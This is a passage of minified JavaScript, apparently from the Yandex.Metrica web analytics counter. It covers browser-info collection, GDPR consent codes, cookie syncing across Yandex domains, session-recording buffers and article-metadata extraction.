                if ((t = mo(t, "performance.timing.msFirstPaint"))) {
                  t -= r;
                  break t;
                }
              }
              t = void 0;
            }
            return t ? ((n[e] = t), Math.round(t)) : null;
          }),
          (Zf.fu = function (t, e, n) {
            var r = n.F;
            return r
              ? ((e = (mo(t, "document.referrer") || "").replace(Eh, "")),
                (n = (r["page-ref"] || "").replace(Eh, "")),
                (r = r["page-url"]),
                (e = e !== n),
                (n = 0),
                (t = Xi(t).href !== r) && e
                  ? (n = 3)
                  : e
                  ? (n = 1)
                  : t && (n = 2),
                n)
              : null;
          }),
          (Zf.en = ws),
          (Zf.la = yc),
          (Zf.ut = function (t, e, n) {
            var r = n.Hc;
            return (
              (n = n.F) && (ts(t) || e.Pe || r) && (n.ut = "noindex"), null
            );
          }),
          (Zf.v = wo(Pc.Ja, Ho)),
          (Zf.cn = Dh),
          (Zf.dp = function (t) {
            var e = Pu(t),
              n = e.l("bt", {});
            if (gu(e.l("bt"))) {
              var r = mo(t, "navigator.getBattery");
              try {
                n.p = r && r.call(t.navigator);
              } catch (t) {}
              e.o("bt", n),
                n.p &&
                  n.p.then &&
                  n.p.then(
                    Ur(t, "bi:dp.p", function (t) {
                      n.Qj = mo(t, "charging") && 0 === mo(t, "chargingTime");
                    })
                  );
            }
            return Nf(n.Qj);
          }),
          (Zf.ls = Io(function (t, e) {
            var n = vf(t, e.id),
              r = mf(t),
              i = n.l("lsid");
            return +i ? i : ((r = Ki(t, 0, r(gr))), n.o("lsid", r), r);
          }, Go)),
          (Zf.hid = Fn),
          (Zf.z = xh),
          (Zf.i = Ch),
          (Zf.et = Ah),
          (Zf.c = po(Au("navigator.cookieEnabled"), Mf)),
          (Zf.rn = po(Ho, Ki)),
          (Zf.rqn = function (t, e, n) {
            return !(n = n.F) || n.nohit
              ? null
              : ((e = Fc(e)),
                (e = ((t = vf(t, e)).l("reqNum", 0) || 0) + 1),
                t.o("reqNum", e),
                t.l("reqNum") === e ? e : (t.ic("reqNum"), null));
          }),
          (Zf.u = bf),
          (Zf.tp = po(Go, zi, Mf)),
          (Zf.tpid = po(Go, function (t) {
            return (t = Fc(t)), (Bc[t] && Bc[t].Fj) || null;
          })),
          (Zf.w = function (t) {
            return (t = Ci(t))[0] + "x" + t[1];
          }),
          (Zf.s = function (t) {
            var e = mo(t, "screen");
            if (e) {
              t = mo(e, "width");
              var n = mo(e, "height");
              return (
                (e = mo(e, "colorDepth") || mo(e, "pixelDepth")),
                iu("x", [t, n, e])
              );
            }
            return null;
          }),
          (Zf.sk = Au("devicePixelRatio")),
          (Zf.ifr = po(Ec, Mf)),
          (Zf.j = po(Cc, Mf)),
          (Zf.sti = function (t) {
            return Ec(t) && xc(t) ? "1" : null;
          }),
          Zf);
      (Ph.pri = function (t) {
        if (lc(t)) return null;
        var e = Th(t),
          n = e.Yf;
        return (
          gu(n) &&
            ((e.Yf = null),
            Sh(t).then(function (t) {
              e.Yf = t;
            })),
          n ? 1 : null
        );
      }),
        Nu(
          Ph,
          (((Qf = {}).iss = po(Ac, Mf)),
          (Qf.hdl = po(_c, Mf)),
          (Qf.iia = po(kc, Mf)),
          (Qf.cpf = po(Tc, Mf)),
          (Qf.ntf = Io(function (t) {
            t: switch (mo(t, "Notification.permission")) {
              case "denied":
                t = !1;
                break t;
              case "granted":
                t = !0;
                break t;
              default:
                t = null;
            }
            return mu(t) ? null : t ? 2 : 1;
          })),
          (Qf.eu = qf("isEU")),
          (Qf.ns = _h),
          (Qf.np = function (t) {
            if (Ki(t, 0, 100)) t = null;
            else {
              t = So(ac(t), 100);
              for (var e = [], n = 0; n < t.length; n++) {
                var r = t.charCodeAt(n);
                128 > r
                  ? e.push(r)
                  : (127 < r && 2048 > r
                      ? e.push((r >> 6) | 192)
                      : (e.push((r >> 12) | 224),
                        e.push(((r >> 6) & 63) | 128)),
                    e.push((63 & r) | 128));
              }
              t = Dn(e);
            }
            return t;
          }),
          Qf)
        ),
        (Ph.ds = function (t, e, n) {
          if (((e = Fc(e)), (t = zr(t)), (void 0 === (n = n.F) ? {} : n).nohit))
            return null;
          var r = (n = null);
          if (
            (mo(t, "getEntriesByType") &&
              (r = mo(t.getEntriesByType("navigation"), "0")) &&
              (n = rh),
            !n)
          ) {
            var i = mo(t, "timing");
            i && ((n = nh), (r = i));
          }
          return n
            ? ((t = (function (t, e, n) {
                return Vu(function (n) {
                  var r = n[0],
                    i = n[1];
                  if (ko(r)) return r(t, e) || null;
                  if (ko(i)) return null;
                  var o = !(!e[r] || !e[i]);
                  return (
                    !o &&
                      2 === n.length &&
                      (o = 0 === e[r] && 0 === e[i]) &&
                      ((o = n[1]), (o = !(ih[n[0]] || ih[o]))),
                    o
                      ? 0 > (n = Math.round(e[r]) - Math.round(e[i])) ||
                        36e5 < n
                        ? null
                        : n
                      : 1 === n.length && e[r]
                      ? Math.round(e[r])
                      : null
                  );
                }, n);
              })(t, r, n)),
              (e = (function (t, e) {
                var n = t.length
                  ? Vu(function (t, n) {
                      var r = e[n];
                      return r === t ? null : r;
                    }, t)
                  : e;
                return (
                  (t.length = 0),
                  zu(po(Ho, yo("push", t)), e),
                  Lu(ou(null), n).length === t.length ? null : n
                );
              })((e = oh(e)), t)) && iu(",", e))
            : null;
        }),
        (Ph.bu = Nh),
        (Ph.td = Mh),
        (Ph.wv = wo(2, Ho)),
        (Ph.co = function (t) {
          return Nf(Pu(t).l("jn"));
        });
      var Ih = Mu(Ph);
      Ph.we = function (t, e) {
        return Mf(e.Ta);
      };
      var Oh,
        Lh,
        jh,
        Bh,
        Fh,
        Gh = Ih.concat(th),
        Hh = [
          "RTCPeerConnection",
          "mozRTCPeerConnection",
          "webkitRTCPeerConnection",
        ],
        Uh = Xo(function (t, e) {
          if (!e[t]) {
            var n,
              r = new us(function (t) {
                n = t;
              });
            e[t] = { cg: n, Qa: r, dg: !1 };
          }
          return e[t].Qa;
        }),
        Xh = Io(po(oo, cu)),
        Vh = Io(
          function (t, e, n) {
            var r = Pu(t);
            e = pf(t);
            var i = [];
            (n = Eo([t, n, r, e], Rn)),
              lc(t) ||
                (function (t, e) {
                  if (sc(t)) {
                    var n = ic(t).match(fh);
                    if (n && n.length) return n[1] === e;
                  }
                  return !1;
                })(t, "14.1") ||
                i.push(Eo([An, "pp", ""], n));
            var o = dh(t) && !Mn(t, 68);
            return (
              o || i.push(Eo([_n, "pu", ""], n)),
              o ||
                e.Qd ||
                Mc(t) ||
                (i.push(Eo([En, "zzlc", "na"], n)),
                i.push(Eo([wn, "cc", ""], n))),
              i.length
                ? {
                    Ia: function (t, e) {
                      if (0 === r.l("isEU"))
                        try {
                          zu(po(Ho, Wo), i);
                        } catch (t) {}
                      e();
                    },
                    ba: function (t, e) {
                      var n = t.H;
                      if (n && 0 === r.l("isEU"))
                        try {
                          zu(cu(n), i);
                        } catch (t) {}
                      e();
                    },
                  }
                : {}
            );
          },
          function (t, e, n) {
            return Fc(n);
          }
        ),
        zh = uo("retryReqs", function (t) {
          return pf(t).l("retryReqs", {});
        }),
        Yh = ["0"],
        qh = Hr("g.r", function (t) {
          var e = mf(t),
            n = zh(t),
            r = e(gr),
            i = Fn(t);
          return Cu(
            function (t, e) {
              var n = e[0],
                o = e[1];
              return (
                o &&
                  !o.d &&
                  o.ghid &&
                  o.ghid !== i &&
                  o.time &&
                  500 < r - o.time &&
                  o.time + 864e5 > r &&
                  2 >= o.browserInfo.rqnl &&
                  ((o.d = 1),
                  t.push({
                    protocol: o.protocol,
                    host: o.host,
                    kj: o.resource,
                    ej: o.postParams,
                    N: o.params,
                    eh: o.browserInfo,
                    rk: o.ghid,
                    time: o.time,
                    Ob: ec(n),
                    qh: o.counterId,
                    aa: o.counterType,
                  })),
                t
              );
            },
            [],
            Ru(n)
          );
        }),
        Kh = [],
        Wh = "ru en et fi lt lv pl fr no sr".split(" "),
        Jh =
          (((Oh = {})["GDPR-ok"] = "ok"),
          (Oh["GDPR-ok-view-default"] = "ok-default"),
          (Oh["GDPR-ok-view-detailed"] = "ok-detailed"),
          (Oh["GDPR-ok-view-detailed-0"] = "ok-detailed-all"),
          (Oh["GDPR-ok-view-detailed-1"] = "ok-detailed-tech"),
          (Oh["GDPR-ok-view-detailed-2"] = "ok-detailed-tech-analytics"),
          (Oh["GDPR-ok-view-detailed-3"] = "ok-detailed-tech-other"),
          Oh),
        $h = [],
        Zh = po(cf, qu(fu(af)), uu(",")),
        Qh = po(ju(Gu(af)), _u, Boolean),
        tl = Io(function (t, e) {
          var n = e.l("gdpr");
          return Fu(n, tf) ? "-" + n : "";
        }),
        el = Io(io),
        nl =
          (((Lh = {}).am = "com.am"),
          (Lh.tr = "com.tr"),
          (Lh.ge = "com.ge"),
          (Lh.il = "co.il"),
          (Lh["рф"] = "ru"),
          (Lh["xn--p1ai"] = "ru"),
          (Lh["укр"] = "ua"),
          (Lh["xn--j1amh"] = "ua"),
          (Lh["бел"] = "by"),
          (Lh["xn--90ais"] = "by"),
          Lh),
        rl =
          "85822663:0 21279832:0 34273590:0 64681882:0 42639109:0 23731303:0 86821095:0".split(
            " "
          ),
        il = { cf: rl },
        ol =
          (((jh = {})["an.yandex.ru/mapuid/betweenx/"] = il),
          (jh["an.yandex.ru/mapuid/google/?partner-tag=yandex_ag"] = il),
          (jh["mc.edadeal.ru"] = { Rc: /^([^/]+\.)?edadeal\.ru$/, zg: "ru" }),
          (jh["mc.yandexsport.ru"] = {
            Rc: /^([^/]+\.)?yandexsport\.ru$/,
            zg: "ru",
          }),
          (jh["mc.kinopoisk.ru"] = {
            Rc: /^([^/]+\.)?kinopoisk\.ru$/,
            zg: "ru",
          }),
          jh),
        al =
          (((Bh = {}).ka = "ge"),
          (Bh.ro = "md"),
          (Bh.tg = "tj"),
          (Bh.tk = "tm"),
          (Bh.et = "ee"),
          (Bh.hy = "com.am"),
          (Bh.he = "co.li"),
          (Bh.ky = "kg"),
          (Bh.uk = "ua"),
          (Bh.be = "by"),
          (Bh.tr = "com.tr"),
          (Bh.kk = "kz"),
          Bh),
        ul = Io(io),
        cl = Io(function (t) {
          var e = po(
            ju(po(Ho, ou("ru"), Fo)),
            go(function (t, e) {
              return (t[e] = ["mc.yandex." + e]), t;
            }, {})
          )(zc);
          return (
            zu(function (n) {
              var r = n[0];
              ((n = n[1]).cf && !Fu(t, n.cf)) || (e[r] = [r]);
            }, Ru(ol)),
            e
          );
        }),
        sl = Io(function (t) {
          var e = Xi(t).hostname;
          return Cu(
            function (t, n) {
              var r = n[0],
                i = n[1];
              return (i.Rc && !i.Rc.test(e)) || t.push(r), t;
            },
            [],
            Ru(ol)
          );
        }),
        fl = Xo(function (t, e) {
          var n = Kc(e),
            r = (function (t) {
              return (t = wc(t)), al[t] || "ru";
            })(e),
            i = sl(e) || [ln(e)],
            o = mf(e),
            a = pf(e),
            u = a.l("synced", {});
          return (
            (n = n ? i.concat(r) : i),
            u &&
              (n = Lu(function (t) {
                var e = (u[t] || 1) + 1440 < o(mr);
                return e && delete u[t], e;
              }, n)),
            a.o("synced", u),
            Cu(
              function (e, n) {
                return (
                  zu(function (t) {
                    var r = { domain: t, Gi: n };
                    Ro(t, "/") && (r.ni = 1), e.push(r);
                  }, t[n] || []),
                  e
                );
              },
              [],
              n
            )
          );
        }),
        hl = (function (t, e) {
          return function (e, n, r) {
            (n = Fc(r)), (r = cl(n));
            var i = fl(r),
              o = Fu(n, rl);
            return Mc(e) || Uu(e)
              ? {}
              : {
                  ba: function (n, r) {
                    var a = n.H,
                      u = Pu(e),
                      c = Kc(e) || o,
                      s = Ec(e);
                    if (((a = !(a && a.l("pv"))), !c || s || a)) return r();
                    if (!(c = i(e)).length) return r();
                    if (u.l("startSync")) ul(e).push(r);
                    else {
                      if ((u.o("startSync", !0), (u = Eo([e, c, qo], t)), o))
                        return u().then(r, r);
                      if (!(c = Kh[0])) return r();
                      c(e)
                        .then(u)
                        .then(r, po(au(r), Ur(e, "sy.c")))
                        .catch(qo);
                    }
                  },
                };
          };
        })(function (t, e) {
          var n = mf(t),
            r = Pu(t),
            i = pf(t),
            o = Qs(t, "c"),
            a = sr(t, o);
          return Cu(
            function (e, o) {
              function u() {
                var e = i.l("synced");
                r.o("startSync", !1),
                  e && ((e[o.Gi] = c), i.o("synced", e)),
                  zu(Wo, ul(t));
              }
              var c,
                s = a(
                  { ua: ["sync.cook"] },
                  [
                    Pc.Ka +
                      "//" +
                      o.domain +
                      (o.ni ? "" : "/sync_cookie_image_check"),
                  ],
                  { Sb: 1500 }
                );
              return (
                s
                  .then(function () {
                    (c = n(mr)), u();
                  })
                  .catch(function () {
                    (c = n(mr) - 1435), u();
                  }),
                (s = wo(s, Ho)),
                e.then(s)
              );
            },
            us.resolve(""),
            e
          ).catch(Ur(t, "ctl"));
        }),
        ll = !1,
        dl = /^[a-z][\w.+-]+:/i,
        pl = {},
        vl = [Un, On, Sn(), Tn],
        ml = "et w v z i u vf".split(" ");
      ml.push("we");
      var gl = Sn(ml);
      vl.push(hl),
        vl.unshift(function (t, e, n) {
          return {
            Ia: function (e, r) {
              var i = vn(t, n);
              (i = i && i.userParams) && e.hd && i(e.hd), r();
            },
          };
        }),
        vl.unshift(function (t, e, n) {
          return {
            ba: function (e, r) {
              if (e.N && (Yi(n, e.N), !e.$ && e.H && e.F)) {
                var i = Oi(t, e.N),
                  o = el(t),
                  a = e.H.l("pv");
                i &&
                  !e.F.nohit &&
                  (a
                    ? encodeURIComponent(i).length > Pc.Og
                      ? o.push([e.H, e.N])
                      : (e.F["site-info"] = i)
                    : ((e.$ = i), (e.Ni = !0)));
              }
              r();
            },
            Ia: function (e, r) {
              var i = el(t),
                o = vn(t, n),
                a = o && o.params;
              a &&
                ((o = Lu(po(Au("0"), ou(e.H)), i)),
                zu(function (e) {
                  a(e[1]), (e = Ju(t)(e, i)), i.splice(e, 1);
                }, o)),
                r();
            },
          };
        }),
        vl.push(fn),
        vl.push(sn),
        vl.push(Vh),
        vl.push(function (t) {
          return {
            ba: function (e, n) {
              var r = e.H,
                i = pf(t).l("fip");
              i && r && (r.o("fip", i), Hn(e, "fip", Nf(i))), n();
            },
          };
        }),
        vl.push(mn());
      var bl = (((Fh = {}).h = vl), (Fh.er = []), Fh);
      bl.adb = [];
      var yl = [Sn(), Tn];
      yl.push(Vh),
        (bl.f = yl),
        (bl[2] = vl),
        (bl[1] = (function (t, e) {
          return Lu(po(Gu(e), Fo), t);
        })(vl, [Tn])),
        (bl.a = vl),
        (bl.g = vl),
        (bl.e = vl);
      var wl = [On];
      wl.push(function (t) {
        return {
          ba: function (e, n) {
            var r = e.H,
              i = void 0 === r ? Uc() : r,
              o = e.Ob,
              a = zh(t);
            (r = i.l("rqnl", 0) + 1),
              i.o("rqnl", r),
              (i = mo(a, iu(".", [o, "browserInfo"]))) && ((i.rqnl = r), bn(t)),
              n();
          },
          Ia: function (e, n) {
            gn(t, e), n();
          },
        };
      }),
        (bl.r = wl);
      var El = [];
      El.push(gl),
        El.push(mn()),
        (bl.p = El),
        (bl[6] = [On]),
        (bl.t = vl),
        (bl[4] = [gl]),
        (bl.W = [gl]);
      var xl = [Un, On, Sn()];
      xl.push(fn),
        xl.push(Vh),
        xl.push(sn),
        xl.push(mn()),
        (bl.n = xl),
        (bl.d = [Sn(["hid", "u", "v", "vf"])]),
        (bl.m = [Sn(["u", "v", "vf"]), mn()]),
        (bl.s = []),
        (bl.u = []),
        (bl.S = [Sn(["v", "hid", "u", "vf", "rn"])]),
        (bl.pi = []),
        vl.unshift(function (t, e, n) {
          return {
            ba: function (e, r) {
              var i = e.H,
                o = e.F;
              if (!i || !o) return r();
              !pl[n.id] &&
                i.l("pv") &&
                n.exp &&
                !o.nohit &&
                ((o.exp = n.exp), (pl[n.id] = !0)),
                (i = o["page-ref"]);
              var a = o["page-url"];
              return (
                i && a !== i
                  ? (o["page-ref"] = cn(t, i))
                  : delete o["page-ref"],
                (o["page-url"] = cn(t, a).slice(0, Pc.Qg)),
                r()
              );
            },
          };
        }),
        (bl[5] = Lu(po(Gu([Un, On]), Fo), vl));
      var Cl,
        Al = yu(us.reject, us, Gi()),
        _l = (((Cl = {}).h = Xn), (Cl.er = wo(Al, Ho)), Cl);
      (_l.a = Xn),
        (_l.p = yn),
        (_l[4] = yn),
        (_l.f = Xn),
        (_l.n = Xn),
        (_l[6] = function (t, e, n) {
          var r = sr(t, e);
          return function (t) {
            return Yn(0, n, t, !0).then(
              Eo([t, ["https://mc.yandex.md/cc"], { Se: !0, Ig: !1 }], r)
            );
          };
        }),
        (_l[1] = Xn),
        (_l.n = Xn),
        (_l.c = sr),
        (_l.g = Xn),
        (_l.e = Xn),
        (_l[2] = Xn),
        (_l.r = function (t, e, n) {
          var r = yn(t, e, n),
            i = Xn(t, e, n);
          return function (t, e, n) {
            return "webvisor" === n ? r(t, e, t.F["wv-part"]) : i(t, e);
          };
        }),
        (_l.adb = Vn),
        (_l.s = sr),
        (_l.S = Xn),
        (_l.u = sr),
        (_l.pi = sr),
        (_l.m = function (t, e, n) {
          return function (r, i) {
            var o,
              a = r.F;
            return (
              ((o = {})["page-url"] = (a && a["page-url"]) || ""),
              (a = o),
              (o = Nu(r, { F: Nu(r.F || {}, a) })),
              Vn(t, e, n)(o, "clmap/" + i.id).catch(Ur(t, "c.m"))
            );
          };
        }),
        (_l.d = Xn),
        (_l.t = Xn),
        (_l.W = yn),
        (_l[5] = Xn),
        (_l[8] = sr);
      var kl,
        Tl,
        Sl = Hr(
          "g.sen",
          function (t, e, n) {
            var r = Qs(t, e);
            n = (function (t, e, n) {
              var r;
              return (
                (r = bl[e]) || (r = vl),
                (r = r.slice()).unshift(dn),
                r.unshift(hn),
                Vu(po(wu([t, e, n]), Wo), r)
              );
            })(t, e, n);
            var i = _l[e],
              o = i ? i(t, r, n) : Xn(t, r, n);
            return function () {
              var t = Oo(arguments),
                n = t.slice(1);
              return (t = Nu(t[0], { ua: [e] })), o.apply(void 0, $o([t], n));
            };
          },
          Al
        ),
        Rl = Io(po(Au("id"), Gu([26812653])), Fc),
        Ml = Io(
          Hr("dc.init", function (t, e) {
            var n = Xi(t),
              r = uh(t, e),
              i = lf(t),
              o = un(t),
              a = o.yi;
            return (
              (o = o.mi),
              a && !o && i.o("debug", "1", void 0, n.host),
              Gn(t) || (!a && !o) ? { log: qo, warn: qo, error: qo } : r
            );
          }),
          Go
        ),
        Nl = Ur(window, "h.p", function (t, e) {
          var n,
            r,
            i = Sl(t, "h", e),
            o = e.qc || "" + Xi(t).href,
            a = e.Oh || t.document.referrer,
            u = {
              H: Uc(((n = {}), (n.pv = 1), n)),
              F: ((r = {}), (r["page-url"] = o), (r["page-ref"] = a), r),
            };
          return (
            (u.N = e.N),
            (u.hd = e.hd),
            e.ac && u.F && (u.F.nohit = "1"),
            i(u, e)
              .then(function (n) {
                n &&
                  (e.ac ||
                    on(
                      t,
                      e,
                      "PageView. Counter " +
                        e.id +
                        ". URL: " +
                        o +
                        ". Referrer: " +
                        a,
                      e.N
                    )(),
                  qn(t, Eo([t, e, n], Cn)));
              })
              .catch(Ur(t, "h.g.s"))
          );
        }),
        Dl = Io(oo, Fc),
        Pl = Hr("p.ar", function (t, e) {
          var n = Sl(t, "a", e);
          return function (r, i, o, a, u, c) {
            var s,
              f,
              h = { F: {}, H: Uc(((s = {}), (s.pv = 1), (s.ar = 1), s)) };
            if (r)
              return (
                (i = Ao(i)
                  ? {
                      title: i.title,
                      $f: i.referer,
                      N: i.params,
                      Ua: i.callback,
                      b: i.ctx,
                    }
                  : { title: i, $f: o, N: a, Ua: u, b: c }),
                (o = Dl(e)).url !== r && ((o.ref = o.url), (o.url = r)),
                (r = r || Xi(t).href),
                (o = i.$f || o.ref || t.document.referrer),
                (a = on(
                  t,
                  e,
                  "PageView. Counter " +
                    e.id +
                    ". URL: " +
                    r +
                    ". Referrer: " +
                    o,
                  i.N
                )),
                (h = n(
                  Nu(h, {
                    N: i.N,
                    title: i.title,
                    F: Nu(
                      h.F,
                      ((f = {}), (f["page-url"] = r), (f["page-ref"] = o), f)
                    ),
                  }),
                  e
                ).then(a)),
                rn(t, "p.ar.s", h, i.Ua || qo, i.b)
              );
          };
        }),
        Il = {
          K: "stamp",
          L: "frameId",
          Y: "meta",
          Ze: "base",
          Cf: "hasBase",
          We: "address",
          Dg: "ua",
          oe: "prev",
          Qf: "namespace",
          Fc: "keystrokes",
          Kf: "isMeta",
          Gc: "modifier",
          mb: "pageWidth",
          lb: "pageHeight",
          rg: "startNode",
          hf: "endNode",
          Jg: "zoomFrom",
          Lg: "zoomTo",
          level: "level",
          duration: "duration",
          wa: "i",
          Jc: "o",
          n: "n",
          r: "r",
          ec: "ct",
          vb: "at",
          Rf: "nm",
          Sf: "ns",
          je: "pa",
          me: "pr",
          ae: "nx",
          Ma: "h",
          Aa: "changes",
          Ve: "a",
          Ye: "b",
          nd: "c",
          ie: "op",
        },
        Ol = ["attributes", "attrs"],
        Ll = (function () {
          function t(t) {
            this.b = t;
          }
          return (
            (t.prototype.Da = function (t) {
              var e = nn(t);
              return (
                (t = Vu(yu(this.Ea, this), e)),
                $n(
                  Oi(
                    this.b,
                    Vu(function (t, n) {
                      var r;
                      return Nu({}, e[n], (((r = {}).data = t), r));
                    }, t)
                  )
                )
              );
            }),
            (t.prototype.Ea = function (t) {
              var e = t.data;
              return "string" != typeof e && (e = Oi(this.b, nn(t.data))), e;
            }),
            (t.prototype.La = function (t) {
              return encodeURIComponent(t).length;
            }),
            (t.prototype.ad = function (t, e) {
              for (
                var n = Math.ceil(t.length / e), r = [], i = 0;
                i < e;
                i += 1
              )
                r.push(t.slice(i * n, n * (i + 1)));
              return r;
            }),
            (t.prototype.isEnabled = function () {
              return !!this.b.JSON;
            }),
            t
          );
        })(),
        jl = Io(function (t) {
          if (void 0 === t.Float32Array || void 0 === t.Uint8Array) return Ze;
          var e = new Float32Array([-0]),
            n = new Uint8Array(e.buffer);
          return 128 === n[3]
            ? function (t, r, i, o) {
                (e[0] = r),
                  (i[o] = n[0]),
                  (i[o + 1] = n[1]),
                  (i[o + 2] = n[2]),
                  (i[o + 3] = n[3]);
              }
            : function (t, r, i, o) {
                (e[0] = r),
                  (i[o] = n[3]),
                  (i[o + 1] = n[2]),
                  (i[o + 2] = n[1]),
                  (i[o + 3] = n[0]);
              };
        }),
        Bl = Je(!1),
        Fl = Je(!0),
        Gl = {
          Bj: "topics",
          gj: "publicationDate",
          dj: "pageUrlCanonical",
          Nj: "updateDate",
          bh: "authors",
          Zg: "articleInfo",
          nj: "rubric",
          hj: "publishersHeader",
          fb: "involvedTime",
          cj: "pageTitle",
          Hi: "maxScrolled",
          af: "chars",
          $g: "articleMeta",
        },
        Hl = (function () {
          function t(t) {
            (this.b = t),
              (this.Gb = po(
                Ru,
                go(function (t, e) {
                  return (t[e[1]] = e[0]), t;
                }, {})
              )(Gl));
          }
          return (
            (t.prototype.wg = function (t) {
              var e,
                n = this.ne(t.data);
              return {
                K: mf(this.b)(pr),
                data: ((e = {}), (e[this.Gb[t.type]] = n), e),
              };
            }),
            (t.prototype.ne = function (t) {
              var e = this;
              return lo(t)
                ? Vu(yu(this.ne, this), t)
                : Ao(t)
                ? po(
                    Ru,
                    go(function (t, n) {
                      var r = n[0];
                      return (t[e.Gb[r] || r] = e.ne(n[1])), t;
                    }, {})
                  )(t)
                : t;
            }),
            (t.prototype.Ea = function (t) {
              return Yt(this.b, Jt, this.wg(t))(rr(qo));
            }),
            (t.prototype.La = function (t) {
              return t[0];
            }),
            (t.prototype.ad = function (t) {
              return [t];
            }),
            (t.prototype.Da = function (t) {
              var e = this;
              return (
                (t = Yt(this.b, Zt, { buffer: Vu(yu(this.wg, this), t) })),
                Wn(
                  this.b,
                  t,
                  20,
                  nr
                )(
                  Cf(function (t) {
                    return (t = zt(e.b, t.slice(-4))), Wn(e.b, t, 20, nr);
                  })
                )(
                  xf(function (t) {
                    return t[t.length - 1];
                  })
                )
              );
            }),
            (t.prototype.isEnabled = function () {
              return Vt(this.b);
            }),
            t
          );
        })(),
        Ul = (function () {
          function t(t, e, n) {
            (this.ef = 0),
              (this.le = 1),
              (this.jd = 5e3),
              (this.b = t),
              (this.sa = e),
              (this.Be = n);
          }
          return (
            (t.prototype.$c = function () {
              this.ef = Br(
                this.b,
                po(yu(this.flush, this), yu(this.$c, this)),
                this.jd,
                "b.f"
              );
            }),
            (t.prototype.send = function (t, e) {
              var n = this.Be(t, e || [], this.le);
              return (this.le += 1), n;
            }),
            (t.prototype.push = function () {}),
            (t.prototype.flush = function () {}),
            t
          );
        })(),
        Xl =
          (((kl = (function (t) {
            function e(e, n, r, i) {
              return (
                void 0 === i && (i = 0),
                ((n = t.call(this, e, n, r) || this).Ke = 0),
                (n.ub = 0),
                (n.Je = 0),
                (n.buffer = []),
                (n.jd = 2e3),
                (n.Z = Fr(e)),
                n.$c(),
                (n.Je = i),
                n
              );
            }
            return (
              Jo(e, t),
              (e.prototype.tf = function (t) {
                return Lu(Boolean, this.Z.O("ag", t));
              }),
              (e.prototype.sf = function (t, e) {
                var n = this;
                t(
                  Zn(Ur(this.b, "wv2.b.st"), function (t) {
                    n.send(t, e);
                  })
                );
              }),
              (e.prototype.uj = function (t, e) {
                var n = this;
                ro(this.b, this.ef);
                var r = Math.ceil(this.sa.La(e) / 63e4),
                  i = this.sa.ad(e, r);
                zu(function (e, i) {
                  var o,
                    a = Nu(
                      {},
                      t,
                      (((o = {}).data = e),
                      (o.partNum = i + 1),
                      (o.end = i + 1 === r),
                      o)
                    );
                  (o = n.sa.Da([a], !1)), n.sf(o, [a]);
                }, i),
                  this.$c();
              }),
              (e.prototype.send = function (e, n) {
                var r = this;
                return (
                  this.Z.O("se", n),
                  t.prototype.send.call(this, e, n).then(Ho, function () {
                    r.Z.O("see", n);
                  })
                );
              }),
              (e.Fd = function (t, n, r, i, o) {
                return (
                  e.ld["" + t + n] ||
                    (this.ld[n] = new e(o, i, r, "m" === n ? 31457280 : 0)),
                  this.ld[n]
                );
              }),
              (e.prototype.Bi = function () {
                return this.Je && this.Ke >= this.Je;
              }),
              (e.prototype.push = function (t) {
                var e = this;
                if (!this.Bi()) {
                  this.Z.O("p", t);
                  var n = this.sa.Ea(t),
                    r = this.sa.La(n);
                  7e5 < r
                    ? this.uj(t, n)
                    : ((n = this.tf(this.buffer.concat([t]))),
                      (n = Cu(
                        function (t, n) {
                          return t + e.sa.La(e.sa.Ea(n));
                        },
                        0,
                        n
                      )),
                      this.ub + n + r >= 7e5 * 0.7 && this.flush(),
                      this.buffer.push(t),
                      (this.ub += r));
                }
              }),
              (e.prototype.C = function (t, e) {
                this.Z.C([t], e);
              }),
              (e.prototype.da = function (t, e) {
                this.Z.da([t], e);
              }),
              (e.prototype.flush = function () {
                var t = this.buffer.concat(this.tf(this.buffer));
                if (t.length) {
                  (this.buffer = []), (this.Ke += this.ub), (this.ub = 0);
                  var e = this.sa.Da(t);
                  this.sf(e, t);
                }
              }),
              e
            );
          })(Ul)).ld = {}),
          kl),
        Vl = (((Tl = {})[1] = 500), (Tl[2] = 500), (Tl[3] = 0), Tl),
        zl = (function () {
          function t(t, e) {
            var n,
              r = this;
            (this.id = "a"),
              (this.Pd = !1),
              (this.Bb = {}),
              (this.pb = {
                "schema.org":
                  "Article NewsArticle Movie BlogPosting Review Recipe Answer".split(
                    " "
                  ),
                Uf: ["article"],
              }),
              (this.Ne = (((n = {}).Answer = 3), (n.Review = 2), n)),
              (this.ph = Io(function (t, e) {
                an(
                  r.b,
                  r.Va,
                  "Warning: content has only " +
                    e.chars +
                    " chars. Required " +
                    Vl[e.type],
                  e
                );
              })),
              (this.b = t),
              (this.root = _i(t)),
              (this.Va = e);
          }
          return (
            (t.prototype.Ba = function (t) {
              return t.element;
            }),
            (t.prototype.uf = function (t, e) {
              var n,
                r = this;
              return (
                Ur(this.b, "P.s." + e, function () {
                  n = r.Bb[e].call(r, t);
                })(),
                n
              );
            }),
            (t.prototype.fj = function (t) {
              var e = Nu({}, t);
              return (
                this.Pd &&
                  !e.id &&
                  Fu(t.type, [3, 2]) &&
                  ((t = iu(", ", Vu(Au("name"), e.authors || []))),
                  (e.pageTitle = t + ": " + e.pageTitle)),
                e.pageTitle || (e.pageTitle = this.ei(e.zb)),
                e.pageUrlCanonical ||
                  ((t = e.id),
                  (e.pageUrlCanonical =
                    "string" == typeof t && /^(https?:)\/\//.test(t)
                      ? e.id
                      : this.ai())),
                e.id || (e.id = e.pageTitle || e.pageUrlCanonical),
                e
              );
            }),
            (t.prototype.va = function (t) {
              var e = this,
                n = {},
                r = this.Ba(t);
              if (!r) return null;
              (n.type = t.type),
                zu(function (r) {
                  n[r] = e.uf(t, r);
                }, Mu(this.Bb));
              var i = mf(this.b);
              return (
                (n.stamp = i(pr)),
                (n.element = t.element),
                (n.zb = r),
                ((n = this.fj(n)).id = n.id ? Zo(n.id) : 1),
                (n.update = function (n) {
                  return e.Ba(t) ? e.uf(t, n) : void 0;
                }),
                n
              );
            }),
            (t.prototype.ei = function (t) {
              for (var e = 1; 5 >= e; e += 1) {
                var n = wa(ui("h" + e, t));
                if (n) return n;
              }
            }),
            (t.prototype.ai = function () {
              var t = ui('[rel="canonical"]', this.root);
              if (t) return t.href;
            }),
            (t.prototype.Af = function () {
              return 1;
            }),
            (t.prototype.pc = function () {
              return [];
            }),
            (t.prototype.Hh = function () {
              var t = this,
                e = this.pc(),
                n = 1;
              return Cu(
                function (e, r) {
                  var i = t.va({ element: r, type: t.Af(r) }) || [];
                  return (
                    lo(i) || (i = [i]),
                    (i = Cu(
                      function (e, n) {
                        var r = e.values,
                          i = e.Ef;
                        return (
                          n && n.chars > Vl[n.type] && !Fu(n.id, i)
